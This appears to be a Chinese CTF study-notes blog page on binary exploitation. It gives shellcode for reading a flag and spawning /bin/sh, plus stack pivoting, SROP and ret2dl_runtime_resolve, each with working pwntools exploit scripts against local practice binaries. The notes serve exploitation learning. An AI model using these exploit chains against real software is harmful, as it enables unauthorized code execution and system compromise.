<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pwntools</span></span><br><span class="line">shellcode = <span class="string">''</span></span><br><span class="line">shellcode += shellcraft.open(<span class="string">'./flag'</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">'eax'</span>,<span class="string">'esp'</span>,<span class="number">0x100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">'esp'</span>,<span class="number">0x100</span>)</span><br><span class="line">payload1 = asm(shellcode)</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">    mov rdi,rsp</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    push 2</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    mov edx,0x100</span></span><br><span class="line"><span class="string">    xor eax,eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov edi,1</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    '''</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>shellcode</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">context.arch = elf.arch</span><br><span class="line">shellcode = asm(shellcreaft.sh())</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">                    push eax</span></span><br><span class="line"><span class="string">                    pop ebx </span></span><br><span class="line"><span class="string">                    push edx</span></span><br><span class="line"><span class="string">                    pop eax</span></span><br><span class="line"><span class="string">                    dec eax</span></span><br><span class="line"><span class="string">                    xor al,0x46</span></span><br><span class="line"><span class="string">                    xor byte ptr[ebx+0x35],al #set int 0x80</span></span><br><span class="line"><span class="string">                    xor byte ptr[ebx+0x36],al</span></span><br><span class="line"><span class="string">                    push ecx </span></span><br><span class="line"><span class="string">                    pop eax</span></span><br><span class="line"><span class="string">                    xor al, 0x41</span></span><br><span class="line"><span class="string">                    xor al, 0x40</span></span><br><span class="line"><span class="string">                    push ecx</span></span><br><span class="line"><span class="string">                    pop eax</span></span><br><span class="line"><span class="string">                    xor al, 0x41</span></span><br><span class="line"><span class="string">                    xor al, 0x40</span></span><br><span class="line"><span class="string">                    push ecx</span></span><br><span class="line"><span class="string">                    pop eax</span></span><br><span class="line"><span class="string">                    xor al, 0x41</span></span><br><span class="line"><span class="string">                    xor al, 0x40</span></span><br><span class="line"><span class="string">                    push ecx # set al=0xb</span></span><br><span class="line"><span class="string">                    pop eax</span></span><br><span class="line"><span class="string">                    xor al, 0x41</span></span><br><span class="line"><span class="string">                    xor al, 0x40</span></span><br><span class="line"><span class="string">                    push edx  # set ecx=0</span></span><br><span class="line"><span class="string">                    pop ecx</span></span><br><span class="line"><span class="string">                    push 0x68 # push /bin/sh</span></span><br><span class="line"><span class="string">                    push 0x732f2f2f</span></span><br><span class="line"><span class="string">                    push 0x6e69622f</span></span><br><span class="line"><span class="string">                    push esp</span></span><br><span class="line"><span class="string">                    pop ebx</span></span><br><span class="line"><span class="string">                    '''</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>orw</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#write by asm</span></span><br><span class="line">shellcode = <span class="string">"""</span></span><br><span class="line"><span class="string">/*open(./flag)*/</span></span><br><span class="line"><span class="string">push 0x1010101</span></span><br><span class="line"><span class="string">xor dword ptr [esp], 0x1016660</span></span><br><span class="line"><span class="string">push 0x6c662f2e</span></span><br><span class="line"><span class="string">mov eax,0x5</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">/*read(fd,buf,0x100)*/</span></span><br><span class="line"><span class="string">mov ebx,eax</span></span><br><span class="line"><span class="string">mov ecx,esp</span></span><br><span class="line"><span class="string">mov edx,0x30</span></span><br><span class="line"><span class="string">mov eax,0x3</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">/*write(1,buf,0x100)*/</span></span><br><span class="line"><span class="string">mov ebx,0x1</span></span><br><span class="line"><span class="string">mov eax,0x4</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pwntools</span></span><br><span class="line">shellcode = <span class="string">''</span></span><br><span class="line">shellcode += shellcraft.open(<span class="string">'./flag'</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">'eax'</span>,<span class="string">'esp'</span>,<span class="number">0x100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">'esp'</span>,<span class="number">0x100</span>)</span><br><span class="line">payload1 = asm(shellcode)</span><br></pre></td></tr></table></figure>

<h2 id="stack-pivot"><a href="#stack-pivot" class="headerlink" title="stack pivot"></a>stack pivot</h2><ul>
<li><p>栈劫持、栈转移</p>
<ul>
<li>场景<ul>
<li>可以溢出的长度很少，ROP不够长</li>
<li>开启PIE，栈的地址不知道，但是有些可控位置已知，如bss</li>
</ul>
</li>
<li>怎么转移栈？<ul>
<li>通过直接控制rsp（用控制rsp的gadget）</li>
<li>通过ebp/rbp<ul>
<li>两次leave ret</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>在函数开始时</p>
<ul>
<li>push ebp</li>
<li>mov ebp, esp</li>
</ul>
</li>
<li><p>函数准备ret时</p>
<ul>
<li><pre><code class="asm">leave
ret
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  相当于</span><br><span class="line"></span><br><span class="line">- &#96;&#96;&#96;asm</span><br><span class="line">  mov esp, ebp</span><br><span class="line">  pop ebp</span><br><span class="line">  ret</span><br></pre></td></tr></table></figure>

leave将ebp的值赋值给esp，而ebp在栈上我们可以控制</code></pre>
</li>
<li><pre><code class="asm">esp可以控制
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    把返回地址覆盖为leave ret的地址</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">- 但是把esp劫持到哪？</span><br><span class="line">  - 已知的地址：常用的就是bss</span><br><span class="line">- 不能从rsp指到的位置开始ROP，还需要填充8字节（8*b‘a’），因为leave后还有一个ret</span><br><span class="line">- 主要意图就是把ROP链放在填充字节内，然后把溢出后的流程指回到栈上继续执行。</span><br><span class="line"></span><br><span class="line">![image-20220307111122983](https:&#x2F;&#x2F;ma9ic-image.obs.cn-north-4.myhuaweicloud.com&#x2F;images&#x2F;image-20220307111122983.png)</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;python</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"># 泄露ebp地址</span><br><span class="line">pl&#x3D;80*&#39;a&#39;</span><br><span class="line">p.send(pl)</span><br><span class="line">p.recvuntil(80*&#39;a&#39;)</span><br><span class="line">leak&#x3D;u64(p.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">log.info(&#39;leak:&#39;+hex(leak))</span><br><span class="line">input_start&#x3D;leak-0x70</span><br><span class="line"></span><br><span class="line"># 泄露puts函数地址</span><br><span class="line">p.recv()</span><br><span class="line">pl&#x3D;8*&#39;a&#39;</span><br><span class="line">pl+&#x3D;p64(pop_rdi_ret)+p64(elf.got[&#39;puts&#39;])</span><br><span class="line">pl+&#x3D;p64(elf.plt[&#39;puts&#39;])</span><br><span class="line">pl+&#x3D;p64(read_input)</span><br><span class="line">pl&#x3D;pl.ljust(80,&#39;a&#39;)</span><br><span class="line">pl+&#x3D;p64(input_start)</span><br><span class="line">pl+&#x3D;p64(leave_ret)</span><br><span class="line">p.send(pl)</span><br><span class="line"></span><br><span class="line"># 算libc</span><br><span class="line">p.recvuntil(&#39;\n&#39;)</span><br><span class="line">leak&#x3D;u64(p.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">log.info(&#39;leak:&#39;+hex(leak))</span><br><span class="line">libc&#x3D;</span><br><span class="line">system&#x3D;</span><br><span class="line">binsh&#x3D;</span><br><span class="line"></span><br><span class="line"># 构造system的ROP链</span><br><span class="line">pl &#x3D; 8*&#39;a&#39;</span><br><span class="line">pl+&#x3D;p64(pop_rdi_ret)+p64(binsh)</span><br><span class="line">pl+&#x3D;p64(system)</span><br><span class="line">pl&#x3D;pl.ljust(80,&#39;a&#39;)</span><br><span class="line">pl+&#x3D;p64(input_start)</span><br><span class="line">pl+&#x3D;p64(leave_ret)</span><br><span class="line">p.send(pl)</span><br></pre></td></tr></table></figure>
</code></pre>
</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 泄露地址用</span></span><br><span class="line">leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">log.info(<span class="string">'leak:'</span>+hex(leak))</span><br></pre></td></tr></table></figure>

<h2 id="srop"><a href="#srop" class="headerlink" title="srop"></a>srop</h2><ul>
<li><p>signal机制</p>
<ul>
<li>signal是进程间互相传递信息的一种方法</li>
<li>软中断</li>
<li>内核为进程保存上下文（保存在栈上）<ul>
<li>各个寄存器</li>
<li>signal信息</li>
<li>sigreturn地址</li>
</ul>
</li>
</ul>
<p><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/image-20220307205020186.png" alt="image-20220307205020186"></p>
<ul>
<li><p>signal frame</p>
<p><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/image-20220307205541528.png" alt="image-20220307205541528"></p>
<ul>
<li>不同架构的signal frame是不同的</li>
</ul>
</li>
<li><p>执行sigreturn</p>
<ul>
<li>恢复上下文<ul>
<li>对应的寄存器pop回去</li>
<li>恢复进程执行</li>
</ul>
</li>
<li>不同架构的sigreturn调用号不同<ul>
<li>32位：77，64位：15</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>signal机制</p>
<ul>
<li>1.signal frame在用户空间，用户可读写</li>
<li>2.sigreturn并不会校验signal frame</li>
</ul>
</li>
<li><p>基本思路</p>
<ul>
<li>伪造signal frame</li>
<li>所有寄存器可以控制</li>
<li>还可以构造srop chain</li>
</ul>
</li>
<li><p>攻击限制</p>
<ul>
<li>binsh地址已知</li>
<li>指令地址已知(system)</li>
<li>栈空间装得下</li>
</ul>
</li>
<li><p>额外的技巧</p>
<ul>
<li><p>控制rax可以通过函数返回值(函数返回值保存在rax寄存器中)</p>
</li>
<li><p>pwntools中有现成的srop工具</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">frame1=SigreturnFrame()</span><br><span class="line">frame1.rax=</span><br><span class="line">frame1.rdi=</span><br><span class="line">payload=str(frame1)</span><br></pre></td></tr></table></figure>
</li>
<li><p>有时候并不是一步srop直接拿到shell，需要多个或和rop搭配使用</p>
</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">context.arch=<span class="string">''</span></span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rax=constants.SYS_read <span class="comment"># 系统调用read函数，也可以寻找匹配的系统调用号</span></span><br><span class="line">frame.rdi=<span class="number">0</span></span><br><span class="line">frame.rsi=<span class="number">0x600a00</span> <span class="comment"># 选可读可写可执行的地址写入shellcode</span></span><br><span class="line">frame.rdx=<span class="number">0x100</span> <span class="comment"># 读入长度</span></span><br><span class="line">frame.rip=syscall_ret</span><br><span class="line">frame.rsp=<span class="number">0x600a00</span></span><br><span class="line"></span><br><span class="line">pl=<span class="string">''</span></span><br><span class="line">pl+=<span class="number">0x20</span>*<span class="string">'a'</span></span><br><span class="line"><span class="comment"># 利用read函数返回值为读入长度，且返回值保存在rax来控制rax</span></span><br><span class="line">pl+=p64(read_input)</span><br><span class="line">pl+=p64(syscall_ret)</span><br><span class="line">pl+=str(frame)</span><br><span class="line">p.send(pl)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="number">15</span>*<span class="string">'a'</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">shellcode = asm(shellcraft.amd64.linux.sh())</span><br><span class="line"></span><br><span class="line">pl = p64(<span class="number">0x600a10</span>)+p64(<span class="number">0</span>)+shellcode</span><br><span class="line">p.send(pl)</span><br></pre></td></tr></table></figure>

<h2 id="ret2dl-runtime-resolve-freebuf"><a href="#ret2dl-runtime-resolve-freebuf" class="headerlink" title="ret2dl_runtime_resolve(freebuf)"></a>ret2dl_runtime_resolve(freebuf)</h2><ul>
<li>利用动态链接解析地址</li>
<li>对动态链接函数重定位： _dl_runtime_resolve(link_map, rel_offset)</li>
<li>通过控制其中的参数，可以控制解析处那个函数的地址</li>
<li>场景<ul>
<li>没有泄漏的函数，程序中没有使用</li>
<li>远程是奇怪的libc，无法通过一些方法来计算其它函数或者字符串的地址</li>
</ul>
</li>
</ul>
<p>ELF Relocation</p>
<ul>
<li><p>Lazy Binding(延迟绑定)机制</p>
</li>
<li><p>例如第一次调用read</p>
<ul>
<li>先到read@plt</li>
<li>先jmp到got里的地址</li>
<li>实际上存的是read@plt+6</li>
<li>相当于继续执行下一条指令</li>
<li>push一个参数，也就是rel_offset</li>
<li>之后跳转到pre_resolve，(0x8048380)</li>
<li>又push一个参数(link_map)</li>
<li>跳转到_dl_runtime_resolve</li>
</ul>
<p><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/image-20220316085229039.png" alt="image-20220316085229039"></p>
<p>等同于</p>
<p><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/image-20220316090300867.png" alt="image-20220316090300867"></p>
<ul>
<li>从JMPREL开始保存的Elf32_Rel结构体</li>
<li>push的参数是rel_offset</li>
<li>rel_offest就是read函数对应的Elf32_Rel结构体到JMPREL头部的偏移</li>
</ul>
<p><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/image-20220316090921725.png" alt="image-20220316090921725"></p>
<p>（val=r_info）</p>
<ul>
<li>通过rel_offest找到结构体之后</li>
<li>通过r_info计算R_SYM和R_TYPE</li>
<li>通过R_SYM找到SYMTAB上的Elf32_Sym结构体</li>
</ul>
<p><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/image-20220316091324724.png" alt="image-20220316091324724"></p>
<p><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/image-20220316091550934.png" alt="image-20220316091550934"></p>
<ul>
<li>st_name保存的是函数名（字符串）到STRTAB头的偏移</li>
<li>找到“read”字符串</li>
</ul>
</li>
<li><p>简要概括</p>
<ul>
<li><p>第一次调用，call read(0, buf, 0x100)</p>
</li>
<li><p>第一步，找到<code>Elf32_Rel</code>位置</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Elf32_Rel * rel_entry = JMPREL + rel_offset;</span><br></pre></td></tr></table></figure>
</li>
<li><p>第二步，找到<code>Elf32_Sym</code>位置</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Elf32_Sym * sym_entry = &amp;SYMTAB [ELF32_R_SYM(rel_entry-&gt;r_info)];</span><br></pre></td></tr></table></figure>
</li>
<li><p>第三步，找到<code>sym_name</code>位置</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> * sym_name = STRTAB + sym_entry -&gt; st_name;</span><br></pre></td></tr></table></figure>
</li>
<li><p>第四步，定位</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_search_for_symblo_(link_map, sym_name);</span><br></pre></td></tr></table></figure>
</li>
<li><p>第五步，调用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x100</span>)</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>解析到system利用思路</p>
<ul>
<li>32位为例</li>
<li>覆盖返回地址为pre_resolve</li>
<li>给_dl_runtime_resolve和system布置好参数和返回地址、</li>
<li>布置好fake的结构体（伪造好的Rel和Sym的结构体）</li>
<li>进入到system，getshell</li>
</ul>
<p><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/image-20220316093112070.png" alt="image-20220316093112070"></p>
<ul>
<li>利用栈劫持把栈转移到bss段上，因为bss段地址已知方便后续使用伪造结构的地址</li>
</ul>
<p><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/image-20220316143526872.png" alt="image-20220316143526872"></p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'sp'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./bof'</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">elf=ELF(<span class="string">'./bof'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># readelf -d ./bof</span></span><br><span class="line">JMPREL = <span class="number">0x8048330</span></span><br><span class="line">STRTAB = <span class="number">0x8048278</span></span><br><span class="line">SYMTAB = <span class="number">0x80481d8</span></span><br><span class="line"></span><br><span class="line">pre_resolve = <span class="number">0x8048380</span></span><br><span class="line"></span><br><span class="line">bss = elf.bss()</span><br><span class="line">base = bss+<span class="number">0x800</span> <span class="comment"># 栈转移过程中是在bss段后面开始的，不要离bss段太近，相当于栈的大小</span></span><br><span class="line">log.info(<span class="string">'base: '</span>+hex(base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 栈劫持</span></span><br><span class="line">p.recv()</span><br><span class="line">rop = ROP(<span class="string">'./bof'</span>)</span><br><span class="line">rop.raw(<span class="number">112</span>*<span class="string">b'a'</span>) <span class="comment"># 输入到返回地址的偏移</span></span><br><span class="line">rop.read(<span class="number">0</span>, base, <span class="number">200</span>)</span><br><span class="line">rop.migrate(base)</span><br><span class="line">p.sendline(rop.chain())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 伪造结构体</span></span><br><span class="line">fake_start = base+<span class="number">16</span> <span class="comment"># 前四个pl</span></span><br><span class="line">rel_offset = fake_start - JMPREL</span><br><span class="line">elf32_sym = fake_start+<span class="number">8</span></span><br><span class="line"></span><br><span class="line">align = <span class="number">0x10</span>-(elf32_sym-SYMTAB)%<span class="number">0x10</span> <span class="comment"># padding to 0x10</span></span><br><span class="line">elf32_sym += align</span><br><span class="line"></span><br><span class="line">index_sym = (elf32_sym-SYMTAB)/<span class="number">0x10</span></span><br><span class="line">r_info = (index_sym&lt;&lt;<span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line"></span><br><span class="line">elf32_rel_struct = p32(elf.got[<span class="string">'write'</span>])+p32(r_info)</span><br><span class="line"></span><br><span class="line">st_name = elf32_sym+<span class="number">0x10</span>-STRTAB</span><br><span class="line">elf32_sym_struct = p32(st_name)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pl = p32(pre_solve)</span><br><span class="line">pl += p32(rel_offset) <span class="comment"># pre_solve前push了一个参数，因已经栈劫持直接写入</span></span><br><span class="line">pl += <span class="string">'aaaa'</span> <span class="comment"># return address</span></span><br><span class="line">pl += p32(base+<span class="number">100</span>) <span class="comment"># /bin/sh</span></span><br><span class="line">pl += elf32_rel_struct</span><br><span class="line">pl += align*<span class="string">b'a'</span></span><br><span class="line">pl += elf32_sym_struct</span><br><span class="line">pl += <span class="string">'system\x00\x00'</span></span><br><span class="line">pl = pl.ljust(<span class="number">100</span>, <span class="string">'\x00'</span>)</span><br><span class="line">pl += <span class="string">'/bin/sh\x00'</span> <span class="comment"># base+100</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sleep(10) # 调试用，io正常发送</span></span><br><span class="line"></span><br><span class="line">p.sendline(pl)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> roputils <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./bof'</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'sp'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">rop = ROP(<span class="string">'./bof'</span>)</span><br><span class="line">bss = rop.section(<span class="string">'.bss'</span>)</span><br><span class="line">buf = rop.fill(<span class="number">112</span>)</span><br><span class="line">buf += rop.call(<span class="string">'read'</span>, <span class="number">0</span>, bss, <span class="number">0x200</span>)</span><br><span class="line">buf += rop.dl_resolve_call(bss+<span class="number">20</span>, bss) <span class="comment"># bss+20,解析到system函数对应的data部分的地址</span></span><br><span class="line">p.send(buf)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">buf = rop.string(<span class="string">'/bin/sh'</span>)</span><br><span class="line">buf += rop.fill(<span class="number">20</span>, buf)</span><br><span class="line">buf += rop.dl_resolve_data(bss+<span class="number">20</span>, <span class="string">'system'</span>)</span><br><span class="line">p.send(buf)</span><br><span class="line"></span><br><span class="line">p.initeractive()</span><br></pre></td></tr></table></figure>

<h2 id="ret2dlresolve-wiki"><a href="#ret2dlresolve-wiki" class="headerlink" title="ret2dlresolve(wiki)"></a>ret2dlresolve(wiki)</h2><p><strong>原理</strong></p>
<p>在 Linux 中，程序使用 <code>_dl_runtime_resolve(link_map_obj, reloc_offset)</code> 来对动态链接的函数进行重定位。那么如果我们可以控制相应的参数及其对应地址的内容是不是就可以控制解析的函数了呢？答案是肯定的。这也是 ret2dlresolve 攻击的核心所在。</p>
<p>具体的，动态链接器在解析符号地址时所使用的重定位表项、动态符号表、动态字符串表都是从目标文件中的动态节 <code>.dynamic</code> 索引得到的。所以如果我们能够修改其中的某些内容使得最后动态链接器解析的符号是我们想要解析的符号，那么攻击就达成了。</p>
<p>思路 1 - 直接控制重定位表项的相关内容</p>
<p>由于动态链接器最后在解析符号的地址时，是依据符号的名字进行解析的。因此，一个很自然的想法是直接修改动态字符串表 <code>.dynstr</code>，比如把某个函数在字符串表中对应的字符串修改为目标函数对应的字符串。但是，动态字符串表和代码映射在一起，是只读的。此外，类似地，我们可以发现动态符号表、重定位表项都是只读的。</p>
<p>但是，假如我们可以控制程序执行流，那我们就可以伪造合适的重定位偏移，从而达到调用目标函数的目的。然而，这种方法比较麻烦，因为我们不仅需要伪造重定位表项，符号信息和字符串信息，而且我们还需要确保动态链接器在解析的过程中不会出错。</p>
